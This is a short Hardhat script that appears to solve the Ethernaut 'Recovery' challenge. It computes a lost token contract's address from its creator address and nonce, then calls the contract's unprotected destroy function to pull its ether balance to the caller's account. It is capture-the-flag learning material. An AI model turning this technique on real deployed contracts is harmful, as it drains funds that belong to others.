const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xb348FB17fB0c3c11c5d4A52cE10c811888625aaa";
  const RecoveryContract = await ethers.getContractFactory("Recovery");
  const Recovery = RecoveryContract.attach(Instance);
  const nonce = "0x01";
  const rlpEncoded = ethers.utils.RLP.encode([Instance, nonce]);
  const contractAddress = ethers.utils.keccak256(rlpEncoded);
  console.log(`0x${contractAddress.substring(contractAddress.length - 40)}`);
  // You can also find the address in the internalTransaction of the Ethernaut Instance & double Check it with contractAddress we get..
  const SimpleTokenAddress = "0x27eaae6eb87994dbf16d05b7d4b1c7e28557d716";
  const SimpleToken = await ethers.getContractAt(
    "SimpleToken",
    SimpleTokenAddress,
    owner
  );
  const tokenName = await SimpleToken.name();
  await SimpleToken.destroy(owner.address);
  console.log(tokenName, "tokenName");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
